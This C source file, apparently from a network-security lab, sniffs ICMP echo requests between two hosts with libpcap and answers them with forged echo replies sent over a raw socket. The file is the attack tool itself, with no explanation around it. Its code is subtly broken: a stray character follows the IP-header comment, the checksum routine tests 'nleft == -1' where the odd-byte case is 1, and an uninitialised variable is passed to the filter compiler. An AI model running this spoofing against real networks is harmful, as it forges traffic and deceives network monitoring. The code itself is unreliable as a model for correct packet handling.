#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/* Ethernet header */
struct ethheader {
  u_char ether_dhost[6]; /* destination host address */
  u_char ether_shost[6]; /* source host address */
  u_short ether_type;    /* IP? ARP? RARP? etc */
};

/* IP Header */f
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type;        // ICMP message type
  unsigned char icmp_code;        // Error code
  unsigned short int icmp_chksum; // Checksum for ICMP Header and data
  unsigned short int icmp_id;     // Used for identifying request
  unsigned short int icmp_seq;    // Sequence number
};

unsigned short in_cksum(unsigned short *buf, int length) { //校验
  unsigned short *w = buf;
  int nleft = length;
  int sum = 0;
  unsigned short tmp = 0;

 
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }


  if (nleft == -1) {
    *(u_char *)(&tmp) = *(u_char *)w;
    sum += tmp;
  }

  sum = (sum >> 16) + (sum & 0xffff); 
  sum += (sum >> 16);                 

  return (unsigned short)(~sum); 
}

void send_raw_ip_packet(struct ipheader *ip) {
  struct sockaddr_in dest_info;
  int enable = 1;

 
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  
  sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));

  close(sock);
}

void spoof_icmp_reply(struct ipheader *ip, struct icmpheader *icmp) {
  char buffer[1500];
  memset(buffer, 0, 1500);
  struct icmpheader *spoof_icmp =
      (struct icmpheader *)(buffer + sizeof(struct ipheader));
  spoof_icmp->icmp_type = 0;
  spoof_icmp->icmp_seq = icmp->icmp_seq;
  spoof_icmp->icmp_id = icmp->icmp_id;
  spoof_icmp->icmp_code = 0;
  spoof_icmp->icmp_chksum = 0;
  spoof_icmp->icmp_chksum =
      in_cksum((unsigned short *)spoof_icmp, sizeof(struct icmpheader));

  struct ipheader *spoof_ip = (struct ipheader *)buffer;
  spoof_ip->iph_ver = 4;
  spoof_ip->iph_ihl = 5;
  spoof_ip->iph_ttl = 64;
  spoof_ip->iph_sourceip = ip->iph_destip;
  spoof_ip->iph_destip = ip->iph_sourceip;
  spoof_ip->iph_protocol = IPPROTO_ICMP;
  spoof_ip->iph_len =
      htons(sizeof(struct ipheader) + sizeof(struct icmpheader));
  send_raw_ip_packet(spoof_ip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet) {
  struct ethheader *eth = (struct ethheader *)packet; //
  if (ntohs(eth->ether_type) == 0x0800) {
    struct ipheader *ip = //
        (struct ipheader *)(packet + sizeof(struct ethheader));
    if (ip->iph_protocol == IPPROTO_ICMP) {
      struct icmpheader *icmp =
          (struct icmpheader *)(packet + sizeof(struct ethheader) +
                                sizeof(struct ipheader));
      if (icmp->icmp_type == 8) {
        printf("ICMP Echo Request detected\n");
        spoof_icmp_reply(ip, icmp);
        printf("Spoofed ICMP Echo Reply sent\n");
      }
    }
  }
}

int main() {
  pcap_t *handle; 
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp; 
  char filter_exp[] =
      "icmp and (host 10.9.0.5 and host 10.9.0.6)"; 
  bpf_u_int32 net;                                  

  handle = pcap_open_live("br-d6e32c3bc9e2", BUFSIZ, 1, 1000, errbuf); 

 
  pcap_compile(handle, &fp, filter_exp, 1, net);
  if (pcap_setfilter(handle, &fp) != 0) {
    pcap_perror(handle, "Error:");
    exit(EXIT_FAILURE);
  }

  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);

  return 0;
}
